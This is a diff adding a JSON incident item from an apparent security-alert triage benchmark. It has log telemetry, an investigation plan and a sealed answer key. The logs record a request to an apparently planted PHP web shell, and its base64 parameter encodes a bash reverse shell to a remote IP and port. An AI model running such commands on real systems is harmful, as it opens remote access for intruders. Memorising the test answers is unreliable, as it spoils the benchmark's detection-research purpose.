@@ -1,0 +1,207 @@
+{
+  "incident_id": "ait-wheeler-reverse_shell",
+  "name": "AIT-ADS wheeler/reverse_shell",
+  "source_benchmark": "Cyber-AIT-ADS",
+  "source_scenario": "wheeler/reverse_shell",
+  "alert": {
+    "timestamp": "2022-01-30T17:51:41Z",
+    "host": "wheeler",
+    "user": "unknown",
+    "alert_type": "ait_ads_stage",
+    "summary": "AIT-ADS multi-step stage candidate on wheeler: reverse_shell"
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "alerts"
+    ],
+    "start": "2022-01-30T17:51:41Z",
+    "end": "2022-01-30T17:51:52Z",
+    "hosts": [
+      "wheeler"
+    ]
+  },
+  "telemetry": {
+    "alerts": [
+      {
+        "event_id": "ait-0001-d054be86",
+        "timestamp": "2022-01-30T17:51:41Z",
+        "host": "wheeler",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.38.243.125 - - [30/Jan/2022:17:51:41 +0000] \"GET /wp-content/uploads/2022/01/blupxljcmk-1643529407.9648.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xNzIuMjcuMTgxLjIxOC8zNDU3Mjsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1\" 200 506727 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1643565101.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.38.243.125 - - [30/Jan/2022:17:51:41 +0000] \"GET /wp-content/uploads/2022/01/blupxljcmk-1643529407.9648.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xNzIuMjcuMTgxLjIxOC8zNDU3Mjsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1\" 200 506727 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0002-0b9610f9",
+        "timestamp": "2022-01-30T17:51:52Z",
+        "host": "wheeler",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:51:52 intranet-server su[6892]: Successful su for kford by www-data",
+        "raw_alert": {
+          "timestamp": 1643565112.0,
+          "detector": "AMiner: New event type.",
+          "message": "Jan 30 17:51:52 intranet-server su[6892]: Successful su for kford by www-data"
+        }
+      },
+      {
+        "event_id": "ait-0003-cfa548fc",
+        "timestamp": "2022-01-30T17:51:52Z",
+        "host": "wheeler",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:51:52 intranet-server su[6892]: + /dev/pts/2 www-data:kford",
+        "raw_alert": {
+          "timestamp": 1643565112.0,
+          "detector": "AMiner: New event type.",
+          "message": "Jan 30 17:51:52 intranet-server su[6892]: + /dev/pts/2 www-data:kford"
+        }
+      },
+      {
+        "event_id": "ait-0004-036ad454",
+        "timestamp": "2022-01-30T17:51:52Z",
+        "host": "wheeler",
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:51:52 intranet-server su[6892]: pam_unix(su:session): session opened for user kford by (uid=33)",
+        "raw_alert": {
+          "timestamp": 1643565112.0,
+          "detector": "AMiner: New event type.",
+          "message": "Jan 30 17:51:52 intranet-server su[6892]: pam_unix(su:session): session opened for user kford by (uid=33)"
+        }
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "ait-0001-d054be86",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:51:41Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.38.243.125 - - [30/Jan/2022:17:51:41 +0000] \"GET /wp-content/uploads/2022/01/blupxljcmk-1643529407.9648.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xNzIuMjcuMTgxLjIxOC8zNDU3Mjsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1\" 200 506727 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1643565101.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.38.243.125 - - [30/Jan/2022:17:51:41 +0000] \"GET /wp-content/uploads/2022/01/blupxljcmk-1643529407.9648.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xNzIuMjcuMTgxLjIxOC8zNDU3Mjsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1\" 200 506727 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0002-0b9610f9",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:51:52Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:51:52 intranet-server su[6892]: Successful su for kford by www-data",
+        "raw_alert": {
+          "timestamp": 1643565112.0,
+          "detector": "AMiner: New event type.",
+          "message": "Jan 30 17:51:52 intranet-server su[6892]: Successful su for kford by www-data"
+        }
+      }
+    },
+    {
+      "event_id": "ait-0003-cfa548fc",
+      "source": "alerts",
+      "timestamp": "2022-01-30T17:51:52Z",
+      "host": "wheeler",
+      "fields": {
+        "detector": "AMiner: New event type.",
+        "message": "Jan 30 17:51:52 intranet-server su[6892]: + /dev/pts/2 www-data:kford",
+        "raw_alert": {
+          "timestamp": 1643565112.0,
+          "detector": "AMiner: New event type.",
+          "message": "Jan 30 17:51:52 intranet-server su[6892]: + /dev/pts/2 www-data:kford"
+        }
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "wheeler"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "wheeler"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "AIT-ADS multi-step stage candidate on wheeler: reverse_shell",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "wheeler"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "wheeler"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "AIT-ADS multi-step stage candidate on wheeler: reverse_shell",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "Cyber-AIT-ADS",
+    "scenario": "wheeler/reverse_shell",
+    "answer": "reverse_shell",
+    "accept": [
+      "reverse_shell",
+      "reverse shell"
+    ],
+    "grading": "exact_ci",
+    "sealed": true
+  }
+}
